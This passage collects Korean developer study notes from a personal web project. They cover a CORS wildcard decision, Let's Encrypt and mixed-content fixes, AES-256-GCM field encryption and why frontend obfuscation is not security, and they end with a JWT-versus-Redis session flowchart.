있는 서비스 등). 중요한 건 "쿠키를 쓰는 순간부터는 와일드카드를 쓸 수 없다"는 걸 기억하는 것 —
나중에 이 프로젝트가 인증 방식을 쿠키 기반으로 바꾼다면, 이 와일드카드는 반드시 먼저 손봐야 한다.

(2026-09-08 갱신) 실제로는 인증 방식을 안 바꾼 상태에서도 방어 심층화 차원에서 먼저 손보려 했다 —
CSRF 경로가 원래 안전했다는 판단은 여전히 유효하지만, 스캐너가 이것저것 찔러보는 걸 실제로
본 뒤로는 "지금 당장 위험하지 않다"와 "고칠 필요가 없다"는 다른 문제라고 판단했다.

**(2026-09-09 갱신) 그 판단이 뒤집혔다 — 하지만 배포는 안 됐다.** 위 허용목록 패치는 실제로
PHP `backend/` 위에서 PR #2로 준비까지 됐지만, 그 PR이 머지 없이 close되고 백엔드 자체가 Spring
Boot로 재작성되면서 반영될 기회가 사라졌다. 그리고 새로 작성·**프로덕션에 배포된** Spring
`WebConfig.java`는 명시적으로 다시 `allowedOrigins("*")`를 선택했다 — 코드 주석은 이유를 이렇게
남긴다: "인증이 쿠키가 아니라 `Authorization: Bearer` 헤더 방식이라 CORS 자격증명 문제가 없다."
이건 위 "쿠키 vs 헤더 토큰" 절의 논리와 정확히 같은 근거다 — 즉 **처음부터 이 프로젝트에선
와일드카드가 구조적으로 안전했다는 분석 자체는 맞았고, 허용목록으로 좁힌 건 방어 심층화였을
뿐 필수는 아니었다는 뜻으로 읽을 수 있다.** 다만 이 결정이 "재검토해서 유지"가 아니라 "패치가
반영될 기회를 놓치고 원상태로 돌아간" 우연에 가까운 경로로 벌어졌다는 게 배울 점이다 — 보안
결정은 코드가 바뀔 때마다 다시 증발할 수 있으니, 한 번 고쳤다고 그 상태가 계속 유지된다고
가정하면 안 된다.

<script type="text/markdown" data-name="ComputerScience/Network/HTTPS-and-Mixed-Content.md">
# HTTPS, Let's Encrypt, Mixed Content

---

- **카테고리**: 네트워크/보안, 인프라
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

`RottenNobleProject` — `CODE_MEMO.md`의 `MEMO-WEB-06`(NAS 실배포), `MEMO-WEB-07`(mixed content
수정)에서 실측된 실제 운영 경험을 정리한 주제.

## 정의

HTTPS는 HTTP 통신을 암호화해서, 중간에서 누군가 트래픽을 가로채도 내용을 못 읽게(또는 조작 못
하게) 만드는 프로토콜이다. 이 암호화를 가능하게 하려면 서버가 **인증서**를 가지고 있어야 하는데,
Let's Encrypt는 이 인증서를 무료로, 자동으로 발급해주는 비영리 인증기관(CA)이다. "Mixed
Content(혼합 콘텐츠)"는 HTTPS로 서빙되는 페이지가 내부적으로 HTTP(암호화 안 된) 자원을 불러오려
할 때 브라우저가 이를 차단하는 현상을 가리킨다.

## 요약

RottenNobleProject는 Let's Encrypt로 실제 인증서를 발급받아 HTTPS 서비스를 운영 중인데, 인증서를
붙이는 작업과 "프런트엔드가 요청을 보내는 API 주소를 HTTPS로 바꾸는 작업"이 서로 다른 시점에
따로 처리되는 바람에, 잠깐이지만 사이트 전체의 API 호출이 mixed content로 막히는 실제 장애를
겪었다 — 인증서를 붙이는 것과 그걸 쓰는 모든 곳을 갱신하는 건 별개의 체크리스트라는 걸 실측으로
확인한 사례다.

## 상세

### Let's Encrypt로 인증서를 받기까지 겪은 것

`MEMO-WEB-06`에 기록된 과정을 보면, 인증서 발급 자체보다 그 전 단계(포트 설정)에서 더 많이
막혔다. Synology NAS는 기본적으로 80/443번 포트를 "기본 서버(default)"가 이미 점유하고 있어서,
`rotten-noble.com`을 위한 새 이름 기반 가상 호스트를 같은 포트로 만들 수 없었다. 그래서 내부적으로
가상 호스트를 8081(HTTP)/8443(HTTPS) 포트로 만들고, 공유기의 포트포워딩에서 외부 80→내부 8081,
외부 443→내부 8443으로 연결해 "밖에서 보기엔 평범한 80/443"으로 보이게 우회했다.

그런데 Let's Encrypt가 인증서를 발급하는 방식(ACME 프로토콜의 HTTP-01 챌린지)은 "외부에서 그
도메인의 80번 포트로 접속해서 특정 파일이 실제로 응답하는지" 확인하는 방식이다. 포트포워딩을
8081로 돌려놓은 상태에서는 이 챌린지 요청이 NAS의 실제 80번(DSM 자체 리스너)이 아니라 엉뚱한
곳으로 가서 계속 발급에 실패했다. 해결책은 발급받는 잠깐 동안만 포트포워딩을 80→80(내부)으로
되돌렸다가, 발급이 끝나면 다시 80→8081로 복귀시키는 것이었다 — 인증서 자체의 기술 문제가 아니라,
"인증 기관이 어떻게 소유권을 확인하는지"와 "이 서버의 포트 구조"가 순간적으로 어긋나서 생긴
문제였다.

### Mixed Content — 인증서를 붙였는데 왜 API가 막혔나

인증서 작업이 끝나고 `https://rotten-noble.com`이 정상적으로 열리게 된 뒤에도, 사이트의 글
목록/방명록이 전부 안 뜨는 문제가 남아있었다. 원인은 `frontend/.env.production`의
`REACT_APP_API_BASE_URL` 값이 여전히 `http://rotten-noble.com/backend`로 남아있었기 때문이다.

```
// MEMO-WEB-07이 기록한 변경
- REACT_APP_API_BASE_URL=http://rotten-noble.com/backend
+ REACT_APP_API_BASE_URL=https://rotten-noble.com/backend
```

브라우저는 `https://`로 열린 페이지 안에서 `http://`로 나가는 요청(fetch, `<script>`,
`<img>` 등)을 기본적으로 차단한다 — 이게 mixed content 차단이다. HTTPS 페이지가 통째로
암호화돼 있어도, 그 안에서 암호화 안 된 요청이 하나라도 섞이면 중간자가 그 요청을 가로채거나
조작할 수 있는 구멍이 생기기 때문에, 브라우저가 아예 원천 차단하는 것이다. 이 프로젝트는 정확히
이 상황에 걸렸다 — 페이지 자체는 HTTPS로 잘 열렸지만, 그 페이지가 내부적으로 요청하는 API
주소가 여전히 HTTP였던 것.

**왜 인증서 작업이 끝났다고 이게 자동으로 안 맞춰졌나.** 인증서는 서버(Apache/Web Station)
설정이고, `REACT_APP_API_BASE_URL`은 프런트엔드 빌드에 박히는 값(빌드 시점에 정적으로
치환됨)이다 — 완전히 다른 계층의, 다른 시점에 처리되는 설정이라 하나를 바꿨다고 다른 하나가
저절로 따라 바뀌지 않는다. `MEMO-WEB-07`은 이걸 "같은 체크리스트 항목으로 묶지 않으면 다음에도
같은 순서로 놓칠 수 있다"고 명시적으로 남겨뒀다.

### 실제로 배포된 값인지 확인한 방법

수정 후 단순히 "값을 바꿨다"에서 끝내지 않고, 실제로 빌드된 번들 파일에서 값이 제대로 박혔는지
`grep`으로 확인했다(`build/static/js/main.*.js`에서 `https://` 문자열 검색). React의 환경변수는
빌드 시점에 코드에 직접 치환되므로, "설정 파일을 고쳤다"와 "배포된 실제 코드에 반영됐다"는 서로
다른 사실이고, 재배포를 빠뜨리면 설정만 고치고 실제로는 옛날 빌드가 계속 서빙될 수 있다.

## 비교표

| 계층 | 설정 위치 | 반영 시점 | 이 프로젝트에서 놓쳤던 것 |
|---|---|---|---|
| 서버 인증서(HTTPS) | Synology Web Station | 인증서 발급/갱신 시 | (문제 없었음, `MEMO-WEB-06`) |
| 프런트 API 주소 | `frontend/.env.production` | **빌드 시점**에 코드로 치환 | HTTPS 전환 후에도 `http://`로 남아있었음(`MEMO-WEB-07`) |

## 질문

- **Q. Let's Encrypt 인증서는 왜 자동 갱신을 신경 써야 하나?**
  A. Let's Encrypt 인증서의 유효기간은 90일로 짧다(전통적인 상용 인증서의 1년보다 훨씬 짧음) —
  대신 완전 자동 갱신을 전제로 설계됐다. Synology Web Station은 보통 이 갱신을 자동으로
  처리해주지만, 이 프로젝트의 포트 우회 구조(8081/8443 + 포트포워딩)처럼 비표준적인 설정이
  섞여 있으면 자동 갱신 시점에도 처음 발급 때와 같은 문제(ACME 챌린지가 엉뚱한 포트로 감)가
  재발할 가능성이 있다 — 실제로 재발했는지는 아직 확인된 바 없지만, 잠재적 위험 지점으로
  기억해둘 만하다.

- **Q. mixed content 차단은 왜 콘솔 경고가 아니라 완전 차단인가?**
  A. 브라우저 벤더들이 점점 더 엄격하게 정책을 강화해온 결과다. 예전에는 경고만 뜨고 요청이
  나가는 경우도 있었지만, 최신 브라우저는 활성(active) 콘텐츠(스크립트, fetch/XHR 등)에 대해서는
  기본적으로 완전 차단한다 — 이미지 같은 수동적(passive) 콘텐츠는 상대적으로 관대하게 다뤄지는
  경우가 있지만, API 호출은 활성 콘텐츠로 분류돼 예외 없이 막힌다.

## 예시 코드

```bash
# MEMO-WEB-07이 실제로 검증에 쓴 방법 — 빌드 산출물에 값이 실제로 박혔는지 확인
grep -r "https://rotten-noble.com" build/static/js/main.*.js
```

중요한 정보라 그림으로 남긴다.

## 실무

실무에서도 "인증서는 붙였는데 애플리케이션 설정(API 주소, CDN 주소, 웹훅 URL 등)은 여전히
`http://`로 남아있어서 장애가 난다"는 패턴은 흔하게 반복되는 실수다 — 그래서 많은 팀이 배포
체크리스트에 "모든 하드코딩된 URL을 grep으로 검색"하는 단계를 명시적으로 넣는다. Let's Encrypt는
현재 실무에서 TLS 인증서 발급의 사실상 표준이 됐고(Certbot 같은 자동화 도구와 함께), 유료
인증서를 새로 발급받는 경우는 EV(확장 검증) 인증서처럼 특별한 신뢰 표시가 필요한 경우 정도로
줄었다.

# 저장 데이터 암호화(Encryption at Rest) — 해싱과 무엇이 다른가

---

- **카테고리**: 네트워크/보안, 데이터베이스
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

2026-09-08, 사이트가 스캔/프로빙을 당한 뒤 "DB가 통째로 유출되면 방명록에 남긴 이름까지 그대로
읽힌다"는 지점이 눈에 띄어, 방명록 `name` 컬럼에 암호화를 붙이면서 정리한 주제.
[Password-Hashing](./Password-Hashing.md)과 자주 헷갈리는 개념이라 그 문서와의 차이를 명확히
짚는 데 집중했다.

## 정의

Encryption at rest는 "디스크/DB에 저장되는 동안" 데이터를 암호화해두는 것을 말한다. 핵심은
**되돌릴 수 있다(복호화 가능)**는 점이다 — 올바른 키만 있으면 원래 값을 그대로 복원할 수 있다.
이 점이 [비밀번호 해싱](./Password-Hashing.md)과의 결정적 차이다: 해싱은 의도적으로 되돌릴 수
없게 설계되고(서버는 "일치하는가"만 확인하면 되지 원래 비밀번호를 알 필요가 없다), 암호화는
"나중에 원래 값을 다시 보여줘야 하는" 데이터에 쓴다 — 이름, 주소, 전화번호처럼.

## 요약

"이 값을 나중에 다시 원래대로 보여줘야 하는가?"가 암호화와 해싱을 가르는 질문이다. 그렇다면
암호화(가역), 아니라면(로그인 확인처럼 "일치 여부"만 필요하다면) 해싱(불가역)을 쓴다.

## 상세

### 왜 방명록 이름은 해싱이 아니라 암호화인가

`get_guestbook.php`는 방문자 이름을 화면에 그대로 보여줘야 한다 — "익명123님이 작성"처럼.
해시로 저장했다면 원래 이름을 복원할 방법이 없으므로 이 요구사항 자체를 만족할 수 없다.
그래서 되돌릴 수 있는 암호화가 필요했다.

### AES-256-GCM을 고른 이유

```php
// backend/lib/crypto.php
function encrypt_field(string $plaintext): string
{
    $iv = random_bytes(12); // GCM 표준 96비트 nonce
    $tag = '';
    $ciphertext = openssl_encrypt($plaintext, 'aes-256-gcm', field_encryption_key(), OPENSSL_RAW_DATA, $iv, $tag);
    return 'enc:v1:' . base64_encode($iv . $tag . $ciphertext);
}
```

GCM(Galois/Counter Mode)은 "인증된 암호화(AEAD, Authenticated Encryption with Associated
Data)" 모드다 — 암호화와 동시에 무결성 검증용 태그(`$tag`)를 만든다. 이게 왜 중요하냐면, 옛날
방식인 CBC 모드는 암호화만 하고 "이 암호문이 변조되지 않았는가"는 별도로 확인해야 했는데,
그 확인을 빼먹는 실수(패딩 오라클 공격 등으로 이어짐)가 실무에서 반복적으로 발생했다. GCM은
`openssl_decrypt`에 태그를 같이 넘기면 태그가 안 맞을 때 자동으로 복호화를 실패(`false` 반환)
시켜주므로, "복호화는 됐는데 사실 변조된 값이었다"는 사각지대가 구조적으로 줄어든다.

### nonce(IV)를 매번 새로 만드는 이유

`random_bytes(12)`로 매 암호화마다 새로운 IV(초기화 벡터, GCM에서는 nonce라고도 부른다)를
만든다. 같은 키로 같은 IV를 재사용하면 GCM의 안전성 보장이 깨진다 — 두 암호문을 비교해서 평문에
대한 정보가 새어나갈 수 있다. 그래서 IV는 "비밀"은 아니지만(그래서 암호문과 같이 평문으로
저장해도 안전하다) "절대 재사용하면 안 되는 값"이다. 이 프로젝트는 IV+태그+암호문을 통째로
이어붙여 base64로 인코딩해서 한 컬럼에 저장한다 — 복호화할 때 그 순서 그대로 다시 잘라내 쓴다.

### 레거시 평문과의 공존 — 왜 마이그레이션 스크립트를 안 만들었나

```php
function decrypt_field(string $stored): string
{
    if (strpos($stored, 'enc:v1:') !== 0) {
        return $stored; // 암호화 이전에 저장된 레거시 평문
    }
    // ... 복호화
}
```

암호화를 도입하기 전에 이미 운영 DB에 평문으로 저장된 방명록 이름들이 있다. 이 값들을 일괄
재암호화하는 마이그레이션 스크립트를 짤 수도 있었지만, `enc:v1:` 접두사로 "암호화된 값인지"를
구분할 수 있게 해두면 새/옛 데이터가 같은 컬럼에 섞여 있어도 각자 올바르게 처리된다 — 접두사가
없으면 그냥 그대로 반환한다. 마이그레이션 없이 배포 즉시 하위 호환이 되는 대신, 옛날 데이터는
영원히 평문으로 남는다는 트레이드오프가 있다 — 이 프로젝트처럼 옛 데이터 양이 적고 위험도가
낮은 개인 방명록에서는 합리적인 선택이지만, 규제 대상 개인정보라면 강제 재암호화 배치가
필요했을 것이다.

### 키는 어디에 두나 — 그리고 이게 왜 완전한 해법이 아닌가

암호화 키(`field_encryption_key`)는 `config.local.php`에 base64로 저장된다. 이건 "DB만 유출된
경우"(예: DB 백업 파일이 잘못 노출되거나, DB 서버만 뚫린 경우)를 막아준다 — 공격자가 암호문만
가져가면 키 없이는 원문을 못 읽는다. 하지만 **애플리케이션 서버(파일시스템) 자체가 뚫리면**
`config.local.php`도 같이 읽히므로 이 방어는 무력화된다. 즉 이 암호화는 "DB 유출"과 "서버 전체
장악"을 서로 다른 위협으로 구분해서, 앞의 것만 막아주는 부분적 방어라는 걸 분명히 알아야 한다 —
같은 날 "그럼 `config.local.php` 자체를 암호화하는 건 의미가 있는가"라는 질문도 나왔는데,
결론은 "아니오"였다. 복호화 키를 자동화된 요청 처리 중에 읽으려면 결국 그 키도 서버의 어딘가에
평문으로 있어야 하고, 파일시스템 접근 권한을 가진 공격자에게는 원본 파일을 암호화해도 그 옆의
키 파일까지 같이 노출되므로 보호 효과가 없다 — 이 경우엔 파일 권한(`chmod 600`)처럼 접근 자체를
좁히는 게 실질적인 방어다.

## 비교표

| | 비밀번호 해싱 (`password_hash`) | 필드 암호화 (AES-256-GCM) |
|---|---|---|
| 되돌릴 수 있는가 | 아니오(단방향) | 예(키만 있으면 복원) |
| 서버가 원본 값을 알아야 하나 | 아니오 — 일치 여부만 확인 | 예 — 나중에 원본을 다시 보여줘야 함 |
| 용도 | 로그인 비밀번호 | 이름/주소처럼 화면에 다시 표시해야 하는 개인정보 |
| 키/솔트 유출 시 | 솔트가 유출돼도 각 해시는 여전히 개별 무차별 대입 필요 | 키가 유출되면 암호문 전부 즉시 복호화 가능 |

## 질문

- **Q. 방명록 `message`(작성 내용)는 왜 암호화 안 했나?**
  A. `message`는 애초에 공개 게시판에 누구나 볼 수 있도록 방문자가 스스로 올린 글이다 — DB
  유출 여부와 무관하게 이미 웹사이트에서 공개적으로 노출되는 값이라, 저장 시 암호화가 막아줄
  위협이 없다. 반면 `name`은 짧은 별명/이름으로, 다른 서비스에서 재사용하는 개인 식별 정보일
  가능성이 있어 구분했다.

- **Q. 키를 나중에 바꾸고 싶으면?**
  A. 이 구현은 키 회전을 지원하지 않는다 — 키를 바꾸면 그 전에 암호화된 모든 값이 복호화
  불가능해진다. 진짜 키 회전이 필요하면 옛 키로 복호화 → 새 키로 재암호화하는 배치 작업이
  별도로 필요하다(봉투 암호화(envelope encryption)처럼 "데이터 키"와 "키 암호화 키"를 분리하는
  구조를 쓰면 이 배치 작업 없이도 회전할 수 있지만, 개인 프로젝트 규모에는 과하다고 판단했다).

## 예시 코드

```php
// 저장 시
$encryptedName = encrypt_field($name);
$stmt->bind_param("ss", $encryptedName, $message); // INSERT ...

// 조회 시
$row['name'] = decrypt_field($row['name']);
```

## 플로우차트

이 주제는 [Rate-Limiting.flow.md](./Rate-Limiting.flow.md)처럼 분기가 많은 흐름이 아니라
"암호화 → 저장 → 조회 → 복호화"의 단순한 선형 흐름이라 별도 플로우차트 없이 위 예시 코드로
충분하다고 판단했다.

## 실무

실무에서는 컬럼 단위 애플리케이션 암호화 대신 **DB 자체의 투명한 데이터 암호화(TDE,
Transparent Data Encryption)**를 쓰는 경우도 많다 — MySQL/MariaDB의 InnoDB 테이블스페이스
암호화, AWS RDS의 저장 암호화 등. TDE는 디스크에 물리적으로 접근했을 때(도난, 백업 파일 유출)를
막아주지만, DB 자격증명으로 정상 접속한 쿼리에는 평문이 그대로 보인다 — 즉 "DB 서버가 뚫린 경우"
방어는 애플리케이션 레벨 암호화만큼 강하지 않다. 반대로 애플리케이션 레벨 암호화는 이번처럼
"쿼리 결과 자체는 유출됐지만 애플리케이션 서버까지는 안 뚫린" 시나리오를 막아준다 — 실무에서는
둘을 같이 쓰는 경우가 흔하다(방어 심층화).

## (2026-09-09 갱신) 실제 배포된 백엔드엔 이 암호화가 없다

위 내용은 PHP `backend/lib/crypto.php`에서 실제로 동작하던 구현을 기술한 것이지만, 백엔드가 그
사이 Spring Boot로 완전히 재작성되어 프로덕션에 배포됐고, 새 `GuestbookEntry` 엔티티의 `name`
컬럼은 평문 `VARCHAR(50)` 그대로다 — AES-256-GCM 암호화가 이식되지 않았다.

**(정정, 같은 날) 처음엔 이걸 "이유를 알 수 없는 단순 누락"으로 적었는데, 틀렸다.** 이관을 실제로
수행한 세션의 기록(`DevelopPrompt/CODE_MEMO.md`의 `MEMO-WEB-11`)을 나중에 확인해보니, "암호화는
스키마 변경이 더 큰 별도 작업이라 범위 밖 — 필요해지면 후속 작업으로 남겨둠"이라고 **명시적으로
범위에서 뺀 결정**이었다. CORS 와일드카드가 "다시 생각해보니 원래 안전했다"는 근거가 있는
재확인이었던 것과 마찬가지로, 이것도 근거 없는 방치가 아니라 "이번 이관은 프레임워크 전환으로
범위를 한정한다"는 판단 아래 의도적으로 미룬 항목이다 — 다만 그 사이 방명록 이름은 실제로 평문
그대로 저장되고 있으므로, DB 유출 시 노출된다는 실질적 위험 자체는 CORS 쪽과 달리 그대로 남아있다.

## 출처

2026-09-08, 사용자가 시니어 백엔드 개발자에게 코드 리뷰를 받으며 "브라우저 개발자도구(F12)를
열면 프런트 JS 소스가 그대로 보인다"는 점을 지적받았다 — RottenNobleProject의 직접 코드 학습
세션에서 나온 주제로, 별도 `STUDY-nn` 백로그 항목은 아니다. 같은 날 다른 세션이 PHP 백엔드
보안 패치(`CODE_MEMO.md`의 `MEMO-WEB-09`)를 검토하며 "프런트 JS 난독화는 실효성이 없어
보류"라고 판단한 적이 있는데, 이 문서는 그 판단이 정확히 왜 맞는지를 짚는다.

## 정의

브라우저에서 실행되는 모든 JavaScript/CSS/HTML은 정의상 **클라이언트에게 전달되어야 실행할 수
있는 코드**다. 서버가 아무리 애를 써도, 브라우저가 그 코드를 읽고 실행할 수 있어야 화면이 동작
하므로, 그 코드는 반드시 사용자의 기기에 평문(또는 평문으로 되돌릴 수 있는 형태)으로 도착한다.
난독화(obfuscation)는 변수명을 의미 없는 문자로 바꾸고 코드 구조를 읽기 어렵게 뒤섞는 기법이지만,
**실행 가능한 상태를 유지해야 하므로 원리적으로 되돌릴 수 있다** — 이건 암호화(encryption)와
근본적으로 다른 성질이다.

## 요약

F12로 보이는 걸 막을 방법은 없다 — 난독화는 "읽기 귀찮게" 만들 뿐 "못 읽게" 만들지 못한다.
그래서 진짜 방어선은 "프런트 코드를 숨기는 것"이 아니라 "프런트 코드에 애초에 숨길 게 없게
만드는 것"이다. RottenNobleProject는 이미 이 원칙을 따르고 있다 — 실제로 확인해보니 프런트
코드에는 비밀번호 해시, DB 접속정보, 서명 키 같은 진짜 비밀값이 전혀 들어있지 않다.

## 상세

### 왜 난독화가 "보안"이 아닌가 — security through obscurity

난독화 코드의 예를 보자:

```javascript
// 원본 (Vite 개발 모드)
function login(username, password) {
  return fetch(`${API_BASE_URL}/auth/login`, { ... });
}

// 난독화 후 (예시 — 도구가 이런 식으로 변환한다)
function _0x4a2f(_0x1a,_0x2b){return fetch(_0x3c[0]+"/auth/login",{...})}
```

읽기는 확실히 불편해졌다. 하지만 브라우저는 여전히 이 코드를 **그대로 실행**해야 하므로, 개발자
도구에서 실행 중인 함수에 브레이크포인트를 걸거나, 네트워크 탭에서 실제로 어떤 요청이 나가는지
관찰하거나, 도구(디난독화기)를 돌리면 원래 로직을 다시 읽어낼 수 있다. 이런 상태에 의존하는
방어를 "security through obscurity"(모호함을 통한 보안)라고 부르는데, 보안 업계에서는 이걸
**진짜 보안 계층으로 인정하지 않는다** — 시간과 노력의 장벽을 조금 높일 뿐, 뚫리지 않는다는
보장이 전혀 없기 때문이다. Kerckhoffs의 원칙(암호 시스템은 알고리즘이 공개돼도 키만 안전하면
안전해야 한다)이 이 분야의 오래된 기본 전제다 — "숨기면 안전하다"가 아니라 "공개돼도 안전해야
진짜 안전한 것"이라는 사고방식이다.

### 이 프로젝트의 프런트 코드에 실제로 무엇이 들어있는지 확인

RottenNobleProject의 프런트 빌드 결과물(`frontend/dist/assets/*.js`)에 실제로 무엇이 박혀있는지
점검했다:

- `import.meta.env.VITE_API_BASE_URL` → `https://api.rotten-noble.com/api` — 이건 애초에
  비밀이 아니다. 누구나 브라우저 주소창에 쳐서 확인할 수 있는 공개 API 주소다.
- 관리자 토큰(`rottennoble_admin_token`) — 로그인에 **성공한 사용자의 브라우저**의
  `localStorage`에만 존재한다. 프런트 **코드**(정적 JS 파일) 안에는 토큰 값 자체가 들어있지
  않다 — 코드는 "로그인 후 토큰을 받아서 저장하는 로직"만 담고 있지, 토큰 값 자체를
  하드코딩하고 있지 않다.
- 관리자 비밀번호/해시 — 서버(`backend-spring`)의 환경변수(`ADMIN_PASSWORD_HASH`)에만
  존재하고, 어떤 API 응답에도 포함되지 않는다. 프런트가 그 값을 받아본 적이 없으니, 프런트
  코드를 아무리 읽어도 나올 수 없다.
- DB 접속정보, Redis 접속정보 — 전부 백엔드 컨테이너의 환경변수(`.env.prod`)에만 있고, 프런트
  빌드 산출물과는 완전히 분리된 영역이다.

즉 "숨겨야 할 게 코드 안에 없다"는 게 실제로 확인되는 상태다 — 난독화가 필요 없는 게 아니라,
난독화로 지켜야 할 대상 자체가 애초에 설계상 프런트에 안 들어가게 되어 있다.

### 그럼 진짜 방어선은 어디인가

이 프로젝트의 진짜 방어는 **서버 쪽 인가(authorization) 검사**다:

```java
// backend-spring — AdminSessionInterceptor.java
if (handlerMethod.getMethodAnnotation(RequireAdmin.class) == null) {
    return true; // 인증 불필요 엔드포인트는 통과
}
String token = adminSessionService.extractToken(request);
if (!adminSessionService.isValidToken(token)) {
    throw new UnauthorizedException(...); // 유효한 토큰 없인 여기서 막힌다
}
```

프런트에서 "글쓰기" 버튼을 숨기거나 비활성화하는 건 **사용자 경험(UX)**을 위한 것이지 **보안**이
아니다 — 공격자는 브라우저 UI를 거치지 않고 `curl`로 직접 `POST /api/posts`를 호출할 수 있으므로,
"버튼이 안 보인다"는 아무 방어도 되지 못한다. 실제 방어는 그 요청이 서버에 도착했을 때
`AdminSessionInterceptor`가 Redis에 저장된 유효한 세션인지를 검사하는 지점 하나뿐이다. 이걸
"신뢰 경계(trust boundary)"라고 부르는데, **클라이언트(브라우저)는 절대 신뢰 경계 안쪽에 둘 수
없다** — 사용자가 개발자도구로 무엇이든 조작할 수 있는 환경이기 때문이다.

### 소스맵(source map)은 별개 문제

난독화와 헷갈리기 쉬운 인접 주제로 소스맵이 있다 — 원본 코드와 빌드된 코드를 매핑해주는
파일로, 프로덕션에 실수로 배포하면 난독화/압축 이전의 원본 코드를 그대로 복원해서 보여준다.
이 프로젝트의 Vite 프로덕션 빌드(`npm run build`)는 `build.sourcemap` 옵션을 켜지 않아
기본값(비활성)을 따르므로, 실제 배포 산출물(`frontend/dist/assets/`)에 `.map` 파일이 전혀
포함되지 않는 것을 확인했다 — 이 부분은 의도치 않게라도 이미 안전한 상태다.

## 비교표

| 방법 | 무엇을 막는가 | 진짜 보안인가 | 이 프로젝트의 선택 |
|---|---|---|---|
| JS 난독화 | 코드를 "읽기 귀찮게" | 아니다(되돌릴 수 있음) | 적용 안 함 |
| 소스맵 미배포 | 원본 코드/변수명 복원 | 부분적(방어 심층화 정도) | 이미 기본값으로 미배포 |
| 프런트에 비밀값 자체를 안 둠 | 비밀값 유출 자체를 원천 차단 | 그렇다 | 적용 중 |
| 서버 쪽 인가 검사 | 실제 무단 조작(쓰기·삭제 등) | 그렇다(진짜 신뢰 경계) | 적용 중 (`AdminSessionInterceptor`) |

## 질문

- **Q. 그럼 난독화는 아예 쓸모가 없나?**
  A. 완전히 무의미하진 않다 — 자동화된 스크래핑 봇이 특정 패턴을 문자열 매칭으로 찾는 걸 살짝
  방해하거나, 경쟁사가 UI 로직을 그대로 복사해가는 걸 조금 늦추는 정도의 실익은 있다. 다만 이건
  "보안"이 아니라 "귀찮게 하기"의 영역이고, 이 프로젝트처럼 지켜야 할 진짜 비밀이 프런트에 없는
  경우엔 들일 노력 대비 얻는 게 거의 없다고 판단했다.

- **Q. Vite의 프로덕션 빌드가 하는 압축(minify)도 일종의 난독화 아닌가?**
  A. 목적이 다르다. Minify는 변수명을 짧게, 공백을 제거해 **파일 크기를 줄이는** 최적화가
  1차 목적이고, 읽기 어려워지는 건 부수 효과다. 난독화 전용 도구(예: `javascript-obfuscator`)는
  파일 크기와 무관하게 **의도적으로 읽기 어렵게 만드는 것 자체**가 목적이라는 점에서 다르다.
  RottenNobleProject는 Vite 기본 minify만 쓰고 별도 난독화 도구는 안 쓴다.

- **Q. 그럼 API 키나 서드파티 서비스 키가 필요해지면 어떻게 하나?**
  A. 그 키가 "공개돼도 되는 키"(예: 요청 출처 제한이 걸린 클라이언트 키)인지 "절대 노출되면
  안 되는 키"(예: 결제 API의 시크릿 키)인지부터 구분해야 한다. 후자는 절대 프런트 코드에 두지
  않고, 항상 백엔드가 대신 호출해주는 프록시 패턴을 쓴다 — 이 프로젝트가 지금 하고 있는 것과
  같은 원칙(비밀은 서버에만)의 연장이다.

## 예시 코드

```jsx
// frontend/src/App.jsx — UI에서 버튼을 숨기는 건 UX일 뿐, 보안 경계가 아니다
{loggedIn ? (
  <Link to="/posts/new">글쓰기</Link>
) : (
  <Link to="/login">로그인</Link>
)}
```

```java
// backend-spring — 진짜 경계는 여기, 프런트가 무엇을 보여주든 이 검사를 통과 못 하면 막힌다
@RequireAdmin
@PostMapping
public ResponseEntity<ApiResponse<PostResponse>> create(@RequestBody PostRequest request) { ... }
```

## 실무

실무에서도 프런트엔드 코드 자체를 "비밀"로 취급하지 않는 게 표준이다 — 대신 (1) 프런트에 비밀값을
절대 넣지 않는 빌드 파이프라인 규칙(예: CI에서 `.env` 파일의 `VITE_`/`NEXT_PUBLIC_` 접두사가
아닌 변수가 클라이언트 번들에 섞이면 실패시키는 린트), (2) 프로덕션 소스맵은 별도의 비공개
오류 추적 서비스(Sentry 등)에만 업로드하고 공개 배포본에는 포함하지 않기, (3) 모든 쓰기/민감
읽기 API에 서버 쪽 인가 검사를 두는 것이 조합된다. 난독화 도구(Terser의 mangle 옵션, 별도
obfuscator)를 아예 안 쓰는 팀도 많고, 쓰더라도 "약간의 시간 지연" 이상의 기대는 하지 않는다.

# JWT vs Redis 세션 — 즉시 무효화가 필요한 순간 무엇이 갈리나

> `JWT-vs-Redis-Session.md`의 별첨 플로우차트. 작성 규칙은
> `DevelopPrompt/Unity/VISUALIZE_RULE/04_MERMAID_STYLE.md`를 따른다.
> 기준 시점: 2026-09-08

```mermaid
flowchart TD
    LOGIN["로그인 성공"] --> ISSUE["토큰 발급"]
    ISSUE --> REQ["보호된 요청마다 토큰 제시"]

    REQ --> CHECK{"검증 방식은?"}
    CHECK -->|"이 프로젝트"| SESS["Redis에서 GET"]
    CHECK -->|"JWT였다면"| SIGN["서명만 검증(저장소 조회 없음)"]

    SESS --> LOGOUT1["로그아웃 요청"]
    LOGOUT1 --> DEL["Redis에서 DEL"]:::good
    DEL --> DEAD1["다음 요청부터 즉시 401"]:::good

    SIGN --> LOGOUT2["로그아웃 요청"]
    LOGOUT2 --> NOOP["서버가 할 수 있는 게 없음"]:::bad
    NOOP --> ALIVE["exp 만료 전까지 토큰은 계속 유효"]:::bad

    classDef bad  fill:#3a1f1f,stroke:#c0392b,color:#f5d5d5
    classDef good fill:#1f3a2a,stroke:#27ae60,color:#d5f5e3
```

**읽는 법**: 위쪽 절반(`SESS` 경로)이 이 프로젝트가 실제로 구현한 흐름이고, 아래쪽 절반(`SIGN`
경로)은 JWT를 골랐다면 어떻게 됐을지를 보여주는 가상의 비교 경로다. 초록 노드는 "로그아웃이
실제로 즉시 반영되는 지점", 빨강 노드는 "JWT 기본 구조에서는 막을 방법이 없는 지점"이다.

**핵심**: 두 방식의 차이는 로그인 순간이 아니라 **로그아웃(무효화) 순간**에 드러난다. 평상시
요청 처리는 둘 다 잘 동작하지만, "이 토큰을 지금 당장 죽이고 싶다"는 순간에 Redis 세션은
`DEL` 한 번으로 끝나고, 순수 JWT는 만료 시각이 될 때까지 손을 쓸 방법이 없다.

# JWT vs Redis 세션 — 인증 토큰을 어디서 검증하는가

---

- **카테고리**: 웹 개발, 네트워크/보안
- **상태**: 완료
- **기준 시점**: 2026-09-08
- **관련 레포지토리**: `RottenNoble-Project`

---

## 출처

